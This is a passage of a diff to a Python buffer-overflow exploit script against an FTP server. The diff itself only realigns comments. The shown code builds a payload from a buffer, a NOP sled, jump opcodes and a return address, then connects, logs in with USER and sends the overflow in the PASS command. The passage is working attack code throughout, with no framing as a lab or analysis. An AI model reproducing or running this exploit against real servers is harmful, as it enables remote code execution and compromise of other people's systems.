@@ -44,11 +44,11 @@ exploit = buf + nop + "\xe9\xe3\xfc\xff\xff" + "\xeb\xf9" + "\x90\x90" + ret
 password = "PASS " + exploit + "\r\n"
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# Declare a TCP socket
-client.connect((rhost,rport)) #Connect to TCP socket
+client.connect((rhost,rport))                               #Connect to TCP socket
 client.recv(1024)
-client.sendall("USER " + ftpuser + "\r\n") #Login with FTP creds
+client.sendall("USER " + ftpuser + "\r\n")                  #Login with FTP creds
 client.recv(1024)
-client.sendall(password)	# Send buffer overflow
+client.sendall(password)	                                  # Send buffer overflow
 client.close()
 
 print("\nDone!")
